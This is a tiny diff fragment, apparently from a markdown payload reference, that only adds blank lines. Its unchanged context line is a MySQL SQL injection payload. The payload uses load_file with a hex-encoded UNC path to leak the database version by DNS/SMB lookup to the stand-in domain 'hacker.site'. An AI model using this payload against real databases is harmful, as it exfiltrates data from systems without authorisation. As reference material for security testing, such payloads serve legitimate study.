@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:53.482257+00:00'
 ```bash
 select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
 ```
+
+
